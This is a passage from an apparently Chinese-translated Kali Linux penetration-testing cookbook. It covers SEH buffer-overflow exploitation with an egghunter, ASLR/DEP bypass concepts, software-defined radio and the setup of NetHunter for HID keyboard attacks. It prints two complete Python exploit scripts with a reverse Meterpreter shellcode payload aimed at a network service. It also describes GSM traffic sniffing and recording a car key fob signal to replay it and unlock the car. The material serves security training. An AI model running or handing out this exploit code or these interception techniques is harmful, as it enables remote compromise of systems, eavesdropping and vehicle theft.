当内存中没有足够的空间连续放置我们的 shellcode 时，就会使用蛋猎手。使用这种技术，我们在我们的 shellcode 前面加上一个唯一的标签，然后蛋猎手基本上会在内存中搜索该标签并执行 shellcode。

蛋猎手包含一组编程指令；它与 shellcode 并没有太大的不同。有多种蛋猎手可用。您可以通过 skape 的这篇论文了解更多关于它们以及它们如何工作的信息：[`www.hick.org/code/skape/papers/egghunt-shellcode.pdf`](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)。

# 准备工作

我们将尝试使用一个蛋猎手为我们在上一个教程中使用的相同软件制作一个漏洞利用。利用的逻辑将类似于以下图表所示的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3eba1c6c-372e-4d0e-850e-96b87d14b964.png)

我们的目标是覆盖**nSEH**，然后**SEH**，以便它跳转到蛋猎手 shellcode，当执行时，将在内存中找到并执行我们的 shellcode。

# 如何做...

以下是演示使用蛋猎手的步骤：

1.  我们在 Windows XP 上启动软件并将其附加到调试器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a58a884f-8baa-43f0-b726-980a8d468454.png)

1.  我们已经知道了崩溃字节和绕过 SAFESEH 的地址。

1.  现在我们需要添加我们的蛋猎手，然后使用它来跳转到我们的 shellcode。

1.  正如我们所知，蛋猎手是一种 shellcode，使用 shellcode 的基本规则是确保它没有任何坏字符。

1.  让我们看看我们之前制作的漏洞利用：

```
        #!/usr/bin/python
        import socket
        target_address="192.168.110.12"
        target_port=6660
        buffer = "USV "
        buffer += "\x41" * 962 #offset
        # 6 Bytes SHORT jump to shellcode
        buffer += "\xeb\x06\x90\x90"
        # POP+POP+RET 0x0f9a196a
        buffer += "\x6a\x19\x9a\x0f"
        buffer += "\x90" * 16
        #Shellcode Reverse meterpreter.
        buffer += "\xdb\xde\xd9\x74\x24\xf4\xbf\xcf\x9f\xb1\x9a\x5e"
        buffer += "\x31\xc9\xb1\x54\x83\xee\xfc\x31\x7e\x14\x03\x7e"
        buffer += "\xdb\x7d\x44\x66\x0b\x03\xa7\x97\xcb\x64\x21\x72" 
        buffer += "\xfa\xa4\x55\xf6\xac\x14\x1d\x5a\x40\xde\x73\x4f"
        buffer += "\xd3\x92\x5b\x60\x54\x18\xba\x4f\x65\x31\xfe\xce"
        buffer += "\xe5\x48\xd3\x30\xd4\x82\x26\x30\x11\xfe\xcb\x60"
        buffer += "\xca\x74\x79\x95\x7f\xc0\x42\x1e\x33\xc4\xc2\xc3"
        buffer += "\x83\xe7\xe3\x55\x98\xb1\x23\x57\x4d\xca\x6d\x4f"
        buffer += "\x92\xf7\x24\xe4\x60\x83\xb6\x2c\xb9\x6c\x14\x11"
        buffer += "\x76\x9f\x64\x55\xb0\x40\x13\xaf\xc3\xfd\x24\x74"
        buffer += "\xbe\xd9\xa1\x6f\x18\xa9\x12\x54\x99\x7e\xc4\x1f"
        buffer += "\x95\xcb\x82\x78\xb9\xca\x47\xf3\xc5\x47\x66\xd4"
        buffer += "\x4c\x13\x4d\xf0\x15\xc7\xec\xa1\xf3\xa6\x11\xb1" 
        buffer += "\x5c\x16\xb4\xb9\x70\x43\xc5\xe3\x1c\xa0\xe4\x1b"
        buffer += "\xdc\xae\x7f\x6f\xee\x71\xd4\xe7\x42\xf9\xf2\xf0"
        buffer += "\xa5\xd0\x43\x6e\x58\xdb\xb3\xa6\x9e\x8f\xe3\xd0"
        buffer += "\x37\xb0\x6f\x21\xb8\x65\x05\x24\x2e\x46\x72\x48"
        buffer += "\xa5\x2e\x81\x95\xa8\xf2\x0c\x73\x9a\x5a\x5f\x2c"
        buffer += "\x5a\x0b\x1f\x9c\x32\x41\x90\xc3\x22\x6a\x7a\x6c"
        buffer += "\xc8\x85\xd3\xc4\x64\x3f\x7e\x9e\x15\xc0\x54\xda"
        buffer += "\x15\x4a\x5d\x1a\xdb\xbb\x14\x08\x0b\xda\xd6\xd0"
        buffer += "\xcb\x77\xd7\xba\xcf\xd1\x80\x52\xcd\x04\xe6\xfc"
        buffer += "\x2e\x63\x74\xfa\xd0\xf2\x4d\x70\xe6\x60\xf2\xee"
        buffer += "\x06\x65\xf2\xee\x50\xef\xf2\x86\x04\x4b\xa1\xb3"
        buffer += "\x4b\x46\xd5\x6f\xd9\x69\x8c\xdc\x4a\x02\x32\x3a"
        buffer += "\xbc\x8d\xcd\x69\xbf\xca\x32\xef\x9d\x72\x5b\x0f"
        buffer += "\xa1\x82\x9b\x65\x21\xd3\xf3\x72\x0e\xdc\x33\x7a"
        buffer += "\x85\xb5\x5b\xf1\x4b\x77\xfd\x06\x46\xd9\xa3\x07"
        buffer += "\x64\xc2\xb2\x89\x8b\xf5\xba\x6b\xb0\x23\x83\x19"
        buffer += "\xf1\xf7\xb0\x12\x48\x55\x90\xb8\xb2\xc9\xe2\xe8"
        # NOP SLED
        buffer += "\x90" * (2504 - len(buffer))
        buffer += "\r\n\r\n"
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=sock.connect((target_address,target_port))
        sock.send(buffer)
        print "Sent!!"
        sock.close()
```

1.  假设 shellcode 实际上并不在我们在内存中制作的 6 字节跳转之后。在这种情况下，我们可以使用蛋猎手为软件制作一个可靠的利用。

1.  现在听起来可能很容易，但也有一些复杂之处。我们需要我们的最终利用程序遵循我们在图表中提到的流程，但我们还需要确保代码中有足够的 NOPs 来确保利用。

1.  我们的利用流程应该如下所示，就像我们的情况一样，我们有足够的内存来存放 shellcode。但在其他情况下，我们可能没有那么多内存，或者我们的 shellcode 可能存储在内存的其他地方。在这些情况下，我们可以使用蛋猎手，我们将在后面的教程中介绍：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/98bb2d9f-1042-4142-a474-9d170c4f0a7f.png)

1.  根据前面的流程图，我们的 shellcode 看起来应该是这样的：

```
        #!/usr/bin/python
        import socket
        target_address="192.168.110.12"
        target_port=6660
        #Egghunter Shellcode 32 bytes
        egghunter = ""
        egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\
          x2e\x3c\x05\x5a\x74"
        egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf
          \x75\xe7\xff\xe7"
        # 6 Bytes SHORT jump to shellcode
        nseh = "\xeb\x09\x90\x90"
        # POP+POP+RET 0x0f9a196a
        seh = "\x6a\x19\x9a\x0f"
        #Shellcode Reverse meterpreter. 360 bytes
        buffer = ""
        buffer += "\xdb\xde\xd9\x74\x24\xf4\xbf\xcf\x9f\xb1\x9a\x5e"
        buffer += "\x31\xc9\xb1\x54\x83\xee\xfc\x31\x7e\x14\x03\x7e"
        buffer += "\xdb\x7d\x44\x66\x0b\x03\xa7\x97\xcb\x64\x21\x72"
        buffer += "\xfa\xa4\x55\xf6\xac\x14\x1d\x5a\x40\xde\x73\x4f"
        buffer += "\xd3\x92\x5b\x60\x54\x18\xba\x4f\x65\x31\xfe\xce"
        buffer += "\xe5\x48\xd3\x30\xd4\x82\x26\x30\x11\xfe\xcb\x60"
        buffer += "\xca\x74\x79\x95\x7f\xc0\x42\x1e\x33\xc4\xc2\xc3"
        buffer += "\x83\xe7\xe3\x55\x98\xb1\x23\x57\x4d\xca\x6d\x4f"
        buffer += "\x92\xf7\x24\xe4\x60\x83\xb6\x2c\xb9\x6c\x14\x11"
        buffer += "\x76\x9f\x64\x55\xb0\x40\x13\xaf\xc3\xfd\x24\x74"
        buffer += "\xbe\xd9\xa1\x6f\x18\xa9\x12\x54\x99\x7e\xc4\x1f"
        buffer += "\x95\xcb\x82\x78\xb9\xca\x47\xf3\xc5\x47\x66\xd4"
        buffer += "\x4c\x13\x4d\xf0\x15\xc7\xec\xa1\xf3\xa6\x11\xb1"
        buffer += "\x5c\x16\xb4\xb9\x70\x43\xc5\xe3\x1c\xa0\xe4\x1b"
        buffer += "\xdc\xae\x7f\x6f\xee\x71\xd4\xe7\x42\xf9\xf2\xf0"
        buffer += "\xa5\xd0\x43\x6e\x58\xdb\xb3\xa6\x9e\x8f\xe3\xd0"
        buffer += "\x37\xb0\x6f\x21\xb8\x65\x05\x24\x2e\x46\x72\x48"
        buffer += "\xa5\x2e\x81\x95\xa8\xf2\x0c\x73\x9a\x5a\x5f\x2c"
        buffer += "\x5a\x0b\x1f\x9c\x32\x41\x90\xc3\x22\x6a\x7a\x6c"
        buffer += "\xc8\x85\xd3\xc4\x64\x3f\x7e\x9e\x15\xc0\x54\xda"
        buffer += "\x15\x4a\x5d\x1a\xdb\xbb\x14\x08\x0b\xda\xd6\xd0"
        buffer += "\xcb\x77\xd7\xba\xcf\xd1\x80\x52\xcd\x04\xe6\xfc"
        buffer += "\x2e\x63\x74\xfa\xd0\xf2\x4d\x70\xe6\x60\xf2\xee"
        buffer += "\x06\x65\xf2\xee\x50\xef\xf2\x86\x04\x4b\xa1\xb3"
        buffer += "\x4b\x46\xd5\x6f\xd9\x69\x8c\xdc\x4a\x02\x32\x3a"
        buffer += "\xbc\x8d\xcd\x69\xbf\xca\x32\xef\x9d\x72\x5b\x0f"
        buffer += "\xa1\x82\x9b\x65\x21\xd3\xf3\x72\x0e\xdc\x33\x7a"
        buffer += "\x85\xb5\x5b\xf1\x4b\x77\xfd\x06\x46\xd9\xa3\x07"
        buffer += "\x64\xc2\xb2\x89\x8b\xf5\xba\x6b\xb0\x23\x83\x19"
        buffer += "\xf1\xf7\xb0\x12\x48\x55\x90\xb8\xb2\xc9\xe2\xe8"
        nop = "\x90" * 301
        tag = "w00tw00t"
        buffer1 = "USV "
        buffer1 += nop * 2 + "\x90" * 360
        buffer1 += nseh + seh # 8
        buffer1 += "\x90" * 6 #
        buffer1 += egghunter
        buffer1 += nop
        buffer1 += tag
        buffer1 += buffer
        buffer1 += "\x90" * (3504 - len(buffer))
        buffer1 += "\r\n\r\n"
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=sock.connect((target_address,target_port))
        sock.send(buffer1)
        print "Sent!!"
        sock.close()
```

1.  我们继续将其保存为`script.py`并使用`python script.py`运行它。

1.  而且，我们应该有一个等待我们的 meterpreter 会话。

我们编写的利用代码可能无法在每个系统上以完全相同的方式工作，因为有多个依赖项取决于操作系统版本、软件版本等。

# 另请参阅

+   [`www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/`](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)

+   [`www.fuzzysecurity.com/tutorials/expDev/4.html`](http://www.fuzzysecurity.com/tutorials/expDev/4.html)

# ASLR 和 NX 绕过概述

**地址空间布局随机化**（**ASLR**）于 2001 年由 PaX 项目作为 Linux 补丁引入，并集成到 Windows Vista 和后来的操作系统中。这是一种内存保护，通过随机化可执行文件在内存中加载的位置，可以防止缓冲区溢出。**数据执行防护**（**DEP**）或**不执行**（**NX**）也是在 Windows Vista 上的 Internet Explorer 7 中引入的，它通过阻止从内存中标记为不可执行的代码执行来防止缓冲区溢出。

# 如何做...

我们首先需要规避 ASLR。基本上有两种方式可以绕过 ASLR：

1.  我们寻找在内存中加载的任何反 ASLR 模块。我们将在固定位置上有任何模块的基地址。从这里，我们可以使用**返回导向编程**（**ROP**）方法。我们基本上使用代码的小部分，然后是返回指令，并链式连接所有内容以获得所需的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/84aa6fc8-e246-4289-ae33-e655f26d184b.png)

来源：https://www.slideshare.net/dataera/remix-ondemand-live-randomization-finegrained-live-aslr-during-runtime

1.  我们在这里获得指针泄漏/内存泄漏，并调整偏移量以获取泄漏指针的模块的基地址。

1.  接下来，我们需要绕过 NX/DEP。为此，我们使用众所周知的*ret-to-libc*攻击（在 Linux 中）或 ROP 链接（在 Windows 中）。这种方法允许我们使用`libc`函数来执行我们本来会用 shellcode 完成的任务。

1.  还有一种用于绕过 32 位系统中 ASLR 的方法，因为 32 位与 64 位系统相比具有相对较小的地址空间。这使得随机化范围较小且可行于暴力破解。

1.  这基本上是绕过 ASLR 和 DEP 的基本概念。还有许多更高级的编写利用程序的方法，随着补丁的应用，每天都会发现新的绕过方法。

# 另请参阅

+   [`www.trustwave.com/Resources/SpiderLabs-Blog/Baby-s-first-NX-ASLR-bypass/`](https://www.trustwave.com/Resources/SpiderLabs-Blog/Baby-s-first-NX-ASLR-bypass/)

+   [`taishi8117.github.io/2015/11/11/stack-bof-2/`](http://taishi8117.github.io/2015/11/11/stack-bof-2/)

+   [`www.exploit-db.com/docs/17914.pdf`](https://www.exploit-db.com/docs/17914.pdf)

+   [`tekwizz123.blogspot.com/2014/02/bypassing-aslr-and-dep-on-windows-7.html`](http://tekwizz123.blogspot.com/2014/02/bypassing-aslr-and-dep-on-windows-7.html)

+   [`www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/`](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)


# 第十章：玩转软件定义无线电

在本章中，我们将介绍以下步骤：

+   无线电频率扫描仪简介

+   与 RTLSDR 扫描仪亲身实践

+   玩转`gqrx`

+   为 GSM 窃听校准设备

+   使用 Dump1090 解码 ADS-B 消息

# 介绍

软件定义无线电这个术语的意思是，使用软件实现基于硬件的无线电组件，如调制器、解调器和调谐器。在本章中，我们将介绍不同的步骤，并看看 RTLSDR 可以如何用于玩转频率和通过它传输的数据。

# 无线电频率扫描仪

RTLSDR 是一种非常便宜（约 20 美元）的软件定义无线电，它使用 DVB-T 电视调谐器。在这个步骤中，我们将介绍如何将 RTLSDR 设备连接到 Kali Linux 以测试是否成功检测到。

# 准备工作

对于这个步骤，我们需要一些硬件。它可以很容易地从亚马逊购买或从[`www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/`](https://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/)购买。Kali 已经为我们提供了工具来开始使用它。

# 如何做...

我们连接我们的设备，它应该在 Kali Linux 中被检测到。设备行为不准确是很常见的。以下是运行测试的步骤：

1.  我们将首先使用以下命令运行测试：

```
        rtl_test
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c42d6513-84b3-472d-be7e-59bd84c19dfc.png)

1.  我们可能会看到一些数据包丢失。这是因为在只有 USB 2.0 的 VM 设置中尝试这个。

1.  如果有很多数据包丢失，我们可以通过使用`rtl_test -s 10000000`设置较低的采样率进行测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4beae237-154e-4d53-b629-320c1b5f7b01.png)

1.  现在，我们已经准备好继续下一个步骤并玩弄我们的设备了。

# 与 RTLSDR 扫描仪亲身实践

RTLSDR 扫描仪是一个跨平台的 GUI，可用于频谱分析。它将扫描给定的频率范围，并在频谱图中显示输出。

# 如何做...

这是运行`rtlsdr-scanner`的步骤：

1.  我们将 RTLSDR 连接到系统，并使用以下命令启动扫描：

```
       rtlsdr-scanner
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4e236271-555e-4ca2-a271-4066146b2500.png)

1.  我们应该看到一个新窗口打开，显示工具的 GUI 界面；在这里我们可以简单地输入我们想要执行扫描的频率范围，然后点击开始扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/731c7882-b330-41e5-a415-5415e99031ed.png)

1.  需要一些时间来看到频率的扫描，然后我们将以图形格式看到结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/744458e2-46f7-42d1-90ea-5652f47ff26a.png)

如果应用程序停止响应，建议您降低范围，并选择单一模式而不是连续模式。

# 玩转 gqrx

`gqrx`工具是由 GNU 无线电和 Qt 图形工具包提供支持的开源**软件定义无线电**（**SDR**）接收机。

它具有许多功能，例如：

+   发现连接到计算机的设备

+   处理 I/Q 数据

+   AM、SSB、CW、FM-N 和 FM-W（单声道和立体声）解调器

+   录制和播放音频到/从 WAV 文件

+   录制和播放原始基带数据

+   通过 UDP 流式传输音频输出

在这个步骤中，我们将介绍`gqrx`和另一个工具 RTLSDR 的基础知识。

# 如何做...

以下是使用`gqrx`的步骤：

1.  我们可以使用以下命令安装`gqrx`：

```
        apt install gqrx  
```

1.  完成后，我们通过输入`gqrx`来运行工具。

1.  我们从打开的窗口的下拉菜单中选择我们的设备，然后点击确定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b9176e44-2ff9-4e51-9eb4-d4377f965e75.png)

1.  现在 GQRX 应用程序打开，在接收器窗口的右侧，我们选择要查看的频率。然后我们去文件，点击开始 DSP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7064711b-2eca-456b-b279-f05d69dc1393.png)

1.  现在我们看到一个瀑布，我们应该开始听到扬声器中的声音。我们甚至可以使用接收器选项窗口中的上下按钮更改我们正在收听的频率：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5b7cdbc3-cb60-4b65-a49a-0d9b75868b05.png)

1.  我们将看一个汽车钥匙遥控器的例子，用于锁定/解锁汽车。

1.  当我们按下按钮几次后，我们将看到瀑布图中的变化，显示信号的差异：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5c8884cd-8242-4505-93e0-3a0a96cdbaae.png)

1.  我们可以在记录窗口中记录信号，然后保存。稍后可以解码并使用无线电发射回汽车，使用无线电发射器将其解锁。

1.  要在`443` MHz 处捕获数据，我们可以使用以下命令：

```
        rtl_sdr -f 443M - | xxd
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2bc956bc-def0-4c8e-be76-cfae88b02411.png)

# 还有更多...

要了解更多关于`gqrx`的信息，请访问这些博客：

+   [`gqrx.dk/doc/practical-tricks-and-tips`](http://gqrx.dk/doc/practical-tricks-and-tips)

+   [`blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/`](https://blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/)

# GSM 窃听的校准设备

RTLSDR 还允许我们使用名为`kal`或`kalibrate-rtl`的工具查看 GSM 流量。该工具可以在频段中扫描 GSM 基站。在本教程中，我们将学习如何使用 kalibrate，然后在`gqrx`中确认信道。

# 如何做...

以下是使用 kalibrate 的步骤：

1.  大多数国家使用 GSM900 频段。在美国，是 850。我们将使用以下命令来扫描 GSM 基站：

```
        kal -s GSM900 -g 40  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/dbfcfa74-56d4-49fd-85ac-a683981405c3.png)

1.  几分钟后，它会显示给我们一个基站列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7fdeede3-4f0b-4cd5-9a8f-b36f01a17b81.png)

1.  我们记录频率；在我们的情况下，我们将使用`947.6 MHz`以及偏移量。

1.  现在我们打开 GQRX 并在接收器选项窗口中输入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4c0799c6-8aa7-487a-9c64-faf7147908ab.png)

1.  我们可以在瀑布图中看到设备能够完美地捕捉信号。

1.  现在我们将在数据包级别查看这些数据。我们将使用一个名为`gr-gsm`的工具。

1.  可以使用 apt install `gr-gsm`进行安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5bc74ae3-4f8c-445b-a734-69ba1f72387b.png)

1.  完成后，如果我们输入`grgsm_`并按下*Tab*键，我们将看到一个可用工具列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0f5712a3-cd2d-4506-9b48-346367d55bf1.png)

1.  首先，我们将使用`grgsm_livemon`实时监视 GSM 数据包。我们将打开终端并输入`grgsm_livemon`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/764c17e8-2f4f-4f03-821b-6c7a59e9b67f.png)

1.  在新打开的窗口中，我们将使用 kalibrate 捕获的频率切换到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/88e6470f-6140-4d1d-9357-e42c62b1daf4.png)

1.  我们可以通过拖动并选择图形窗口上的区域来放大特定范围。

1.  在新的终端窗口中，我们输入`wireshark`来启动 Wireshark。

1.  然后我们将适配器设置为 Loopback: lo 并开始我们的数据包捕获：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2786ac25-6405-42c1-b8b2-2b81ac78e000.png)

1.  接下来，我们添加过滤器`gsmtap`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/39058086-d3d3-4042-a99a-c3f474a7c43b.png)

1.  我们应该在信息窗口中看到数据包。我们应该看到一个带有标签系统信息类型 3 的数据包；让我们打开它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/837039fc-16c0-4bcb-bbf1-b1cc49b24568.png)

1.  我们将看到系统信息，如移动国家代码、网络代码和位置区域代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/786f1994-b4a8-48d5-b6d3-39f1cd85f487.png)

1.  现在通过这个教程，我们已经学会了 GSM 数据包的传输方式。

# 还有更多...

以下是一些很棒的视频，让您更好地了解 GSM 嗅探：

+   [`www.crazydanishhacker.com/category/gsm-sniffing-hacking/`](https://www.crazydanishhacker.com/category/gsm-sniffing-hacking/)

# 使用 Dump1090 解码 ADS-B 消息

ADS-B 代表**自动相关监视广播**。这是一种系统，飞机上的电子设备通过数字数据链自动广播飞机的精确位置。

如工具的官方自述中所述，Dump1090 是专为 RTLSDR 设备设计的 Mode S 解码器。

主要特点是：

+   对弱信号的稳健解码。使用 mode1090，许多用户观察到与其他流行解码器相比改进的范围。

+   网络支持—TCP30003 流（MSG5）、原始数据包、HTTP。

+   嵌入式 HTTP 服务器在 Google 地图上显示当前检测到的飞机。

+   使用 24 位 CRC 进行单比特错误校正。

+   能够解码 DF11 和 DF17 消息。

+   能够解码 DF 格式，如 DF0、DF4、DF5、DF16、DF20 和 DF21，其中通过使用 ICAO 地址对校验和字段进行暴力破解，将校验和与 ICAO 地址进行异或运算，我们已经涵盖了。

+   解码来自文件的原始 IQ 样本（使用`--ifile`命令行开关）。

+   交互式 CLI 模式，其中当前检测到的飞机显示为列表，并随着更多数据的到达而刷新。

+   从速度计算 CPR 坐标解码和轨迹计算。

+   TCP 服务器流式传输并接收来自/发送到连接客户端的原始数据（使用`--net`）。

在这个教程中，我们将使用该工具来查看空中交通的可视化。

# 如何做...

以下是使用 Dump1090 的步骤：

1.  我们可以使用命令`git clone https://github.com/antirez/dump1090.git`从 Git 存储库下载该工具：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8b0016fb-0910-4d85-8dbc-5c7e49f95df0.png)

1.  下载完成后，我们进入文件夹并运行`make`。

1.  现在我们应该有一个可执行文件。我们可以使用以下命令运行该工具：

```
        ./dump1090 --interactive -net
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d29a9f10-be34-4d6c-875c-1f33ae6ec79d.png)

1.  几分钟后，我们应该能看到航班，并通过在浏览器中打开`http://localhost:8080`，我们也将能够在地图上看到航班。

# 还有更多...

更多信息可以从[`www.rtl-sdr.com/adsb-aircraft-radar-with-rtl-sdr/`](https://www.rtl-sdr.com/adsb-aircraft-radar-with-rtl-sdr/)了解。


# 第十一章：随身携带的 Kali - NetHunters 和树莓派

在本章中，我们将介绍以下内容：

+   在树莓派上安装 Kali

+   安装 NetHunter

+   超人打字 - HID 攻击

+   我可以给手机充电吗？

+   设置恶意接入点

# 介绍

在某些情况下，在进行渗透测试时，客户可能要求我们进行适当的红队攻击。在这种情况下，手持笔记本电脑走进办公室可能看起来可疑，这就是这一章派上用场的原因。我们可以使用小型设备，如手机或树莓派来进行红队行动，并有效地进行渗透测试。在本章中，我们将讨论如何在树莓派和兼容的手机上设置 Kali Linux，并使用它来对网络执行一些酷炫的攻击。

# 在树莓派上安装 Kali

树莓派是一台价格实惠的 ARM 计算机。它非常小巧，便于携带，因此非常适合用于类似 Kali Linux 的系统进行便携式设备的渗透测试。

在这个教程中，您将学习如何在树莓派上安装 Kali Linux 镜像。

# 准备工作

树莓派支持 SD 卡。在树莓派上设置 Kali 的最佳方法是创建一个可引导的 SD 卡并将其插入 Pi。

# 如何做...

要在树莓派上安装 Kali，请按照以下步骤进行：

1.  我们将首先从 Offensive Security 的网站[`www.offensive-security.com/kali-linux-arm-images/`](https://www.offensive-security.com/kali-linux-arm-images/)下载镜像：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/cfdac0f3-db3e-47b7-a35a-b2276416746c.png)

1.  镜像下载完成后，我们可以使用不同的方法将该镜像写入我们的存储卡。

1.  在 Linux/macOS 上，可以使用`dd`实用程序来完成。可以使用以下命令使用`dd`实用程序：

```
        dd if=/path/to/kali-2.1.2-rpi.img of=/dev/sdcard/path bs=512k  
```

1.  完成此过程后，我们可以将 SD 卡插入 Pi 并启动它。

1.  我们将看到我们的 Kali 启动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2dfd262a-fd28-409f-bb78-133065942415.png)

我们可以参考此链接以获取更详细的指南：[`docs.kali.org/downloading/kali-linux-live-usb-install`](https://docs.kali.org/downloading/kali-linux-live-usb-install)。

# 安装 NetHunter

如 Offensive Security 官方维基所述：

“Kali NetHunter 是一个包括强大的**移动渗透测试平台**的 Android ROM 叠加层。该叠加层包括自定义内核、Kali Linux chroot 和一个配套的 Android 应用程序，可以更轻松地与各种安全工具和攻击进行交互。除了 Kali Linux 中的渗透测试工具库外，NetHunter 还支持几个其他类别，如**HID 键盘攻击**、**BadUSB 攻击**、**Evil AP MANA 攻击**等等。有关组成 NetHunter 的各个部分的更多信息，请查看我们的 NetHunter 组件页面。NetHunter 是由 Offensive Security 和社区开发的开源项目。”

在这个教程中，您将学习如何在 Android 设备上安装和配置 NetHunter，并使用它执行攻击。我们可以在[`github.com/offensive-security/kali-nethunter/wiki`](https://github.com/offensive-security/kali-nethunter/wiki)找到支持的硬件列表。

# 准备工作

在开始之前，我们需要将设备 root，并安装 Team Win Recovery Project 作为自定义恢复。

# 如何做...

安装 NetHunter，请按照以下步骤进行：

1.  我们下载 NetHunter ZIP 文件并将其复制到 SD 卡，然后将手机重新启动到恢复模式。我们正在使用安装了 Cyanogenmod 12.1 的 OnePlus One。可以通过同时按下电源和音量减按钮来启动恢复模式。

1.  一旦进入恢复模式，我们选择屏幕上的安装并选择 ZIP 文件。我们可以从[`www.offensive-security.com/kali-linux-nethunter-download`](https://www.offensive-security.com/kali-linux-nethunter-download)下载 ZIP 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b5d6967b-66de-4c68-b315-968da0c484b9.png)

1.  完成后，我们重新启动手机，应该在应用菜单中看到 NetHunter。

1.  但在开始之前，我们需要从 Play 商店在手机上安装 BusyBox：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7737d945-b9df-43cd-818a-1d8550792597.png)

1.  完成后，我们运行该应用程序并点击安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4937c08d-42c4-4bae-8b44-00bccab15efb.png)

1.  接下来，我们打开 NetHunter，并从菜单中选择 Kali Chroot Manager：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/26de7fde-d27a-4dc7-9486-a9cbd4893e5e.png)

1.  我们点击添加 METAPACKAGES，然后我们将准备好进行下一个教程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/267e5afc-ae24-477b-b3f1-fa7bde81109e.png)

# 超人打字 - HID 攻击

NetHunter 具有一个功能，允许我们将我们的设备和 OTG 电缆行为键盘，因此可以在任何连接的 PC 上键入任何给定的命令。这使我们能够执行 HID 攻击。

“HID（人体接口设备）攻击向量是定制硬件和通过键盘仿真绕过限制的显着组合。因此，当我们插入设备时，它将被检测为键盘，并且使用微处理器和板载闪存存储，您可以向目标机器发送一组非常快速的按键，从而完全破坏它。”

- https://www.safaribooksonline.com/library/view/metasploit/9781593272883/

# 如何操作...

要执行 HID 攻击，请按照以下步骤进行操作：

1.  我们可以通过打开 NetHunter 应用程序来执行它们。

1.  在菜单中，我们选择 HID 攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a458fd73-32e6-4201-b3f7-74f0a464d2ab.png)

1.  我们将看到两个选项卡：PowerSploit 和 Windows CMD：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/83a24814-f368-47f4-b147-e753dd4abae7.png)

